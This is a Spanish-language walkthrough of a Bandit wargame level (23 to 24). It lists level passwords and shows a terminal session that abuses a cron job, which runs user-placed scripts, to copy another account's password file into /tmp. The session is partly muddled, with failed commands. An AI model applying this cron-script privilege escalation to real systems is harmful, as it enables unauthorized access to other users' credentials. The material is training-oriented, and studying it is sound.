## Objetivo 

Un programa se ejecuta automáticamente a intervalos regulares desde cron, el programador de trabajos basado en el tiempo. Busque en /etc/cron.d/ la configuración y vea qué comando se está ejecutando.

NOTA: Este nivel requiere que cree su propio primer script de shell. ¡Este es un gran paso y deberías estar orgulloso de ti mismo cuando superes este nivel!

NOTA 2: Tenga en cuenta que su script de shell se elimina una vez ejecutado, por lo que es posible que desee conservar una copia...

## Datos de acceso al nivel

user bandit23
pass QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solucion

```
bandit23@bandit:~$ cd /etc/cron.d 
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt" > certa6.sh
-bash: certa6.sh: Permission denied
bandit23@bandit:/etc/cron.d$ ls -la
total 56
drwxr-xr-x   2 root root  4096 Oct  5 06:20 .
drwxr-xr-x 106 root root 12288 Oct  5 06:20 ..
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit22
-rw-r--r--   1 root root   122 Oct  5 06:19 cronjob_bandit23
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit24
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Oct  5 06:20 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/etc/cron.d$ echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt" > certa6.sh
-bash: certa6.sh: Permission denied
bandit23@bandit:/etc/cron.d$ cd 
bandit23@bandit:~$ cd /var/spool/$myname/foo
-bash: cd: /var/spool//foo: No such file or directory
bandit23@bandit:~$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt" > certa6.sh
-bash: certa6.sh: Is a directory
bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt" > certa6.sh
-bash: certa6.sh: Is a directory
bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt" > certa6.sh"
> 
> ^C
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 certa6.sh
bandit23@bandit:/var/spool/bandit24/foo$ ls certa6sh
ls: cannot access 'certa6sh': No such file or directory
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/certa_test.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/var/spool/bandit24/foo$ 

```
## Notas adicionales


El script ejecuta y elimina todos los archivos en la carpeta '/var/spool/bandit24'. Este es el caso porque se ejecuta como usuario bandit24, por lo que la variable 'minombre' contiene el valor 'bandit24'. El bucle for recorre los archivos. La primera declaración if garantiza que se ignoren los directorios '.' y '..', que representan las carpetas actual y anterior. Dentro de la declaración if está el código para ejecutar un script, pero solo si el propietario es bandit23. Entonces el archivo será eliminado.

Dado que actualmente hemos iniciado sesión como usuario bandit23, podemos crear un script que nos dará la contraseña de bandit24. Primero, cree un archivo en la carpeta 'tmp'. Esto evita una eliminación anticipada del archivo y dispone de una copia en caso de que algo salga mal. Luego mueva el archivo a la carpeta '/var/spool/bandit24' y se ejecutará.

Puede repetir las líneas del archivo o utilizar un editor de texto como nano o vim. En nano, puedes usar CTRL+S para guardar y CTRL+X para salir.


Me orienté en los guiones vistos anteriormente, pero hay muchos métodos para escribir esto. La primera línea es, como siempre, el shebang, que indica que es un script bash. La segunda línea escribe la contraseña de bandit24 en un archivo en la carpeta creada.

Ahora sólo necesitas dar los permisos necesarios a la carpeta y al archivo. Finalmente, mueva el archivo a la carpeta correcta. También creé el archivo de salida y le otorgué todos los permisos.

## Referencias 

https://www.freecodecamp.org/espanol/news/como-usar-vim-tutorial-para-principiantes/